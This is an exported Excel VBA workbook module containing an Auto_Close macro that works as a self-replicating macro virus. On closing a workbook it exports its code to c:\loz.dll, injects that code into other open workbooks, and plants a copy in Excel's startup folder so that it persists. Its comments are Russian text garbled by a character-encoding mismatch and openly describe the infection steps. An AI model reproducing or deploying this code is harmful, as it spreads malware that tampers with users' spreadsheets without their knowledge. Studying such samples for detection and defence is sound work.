   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "Tento_sešit"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub Auto_Close()
   'àêòèâàöèÿ ïðè çàêðûòèè äîêóìåíòîâ
   On Error Resume Next
   If Dir(Application.StartupPath + "\" & Application.UserName & ".xlm") = Application.UserName & ".xlm" Then p = True
   'ïðîâåðÿåì åñòü ëè íàøà êîïèÿ â startup êàòàëîãå
   Application.VBE.ActiveVBProject.VBComponents("IT").Export "c:\loz.dll"
   'åñëè ôàéë íàéäåí â startup êàòàëîãå òî ýêñïîðòèðóåì êîä â ôàéë c:\loz.dll
   For I = 1 To ActiveWorkbook.VBProject.VBComponents.Count
   If ActiveWorkbook.VBProject.VBComponents(I).Name = "LMD" Then t = True
   'ïðîâåðÿåì åñëè â äîêóìåíòå íàø ìîäóëü
   Next I
   If t = False Then
   'åñëè íåò
   With ActiveWorkbook.VBProject
   With .VBComponents.Import("c:\loz.dll")
   'òî èìïîðòèðóåì êîä èç ôàéëà "c:\loz.dll"
   End With
   End With
   End If
   If p = False Then
   'åñëè â startup êàòàëîãå íåò êîïèé íàøåãî êîäà
   Workbooks.Add.SaveAs Filename:=Application.StartupPath + "\" & Application.UserName & ".xlm"
   'ñîçäàåì ïóñòîé äîêóìåíò â startup êàòàëîãå
   With ActiveWorkbook.VBProject
   With .VBComponents.Import("c:\loz.dll")
   'è âíåäðÿåìñÿ â ñîçäàíûé äîêóìåíò
   End With
   End With
   Workbooks(Application.UserName & ".xlm").Save
   'ñîõðàíèì äîêóìåíò â startup êàòàëîãå
   End If
   ActiveWorkbook.Save
   'ñîõðàíèì àêòèâíûé äîêóìåíò
   End Sub
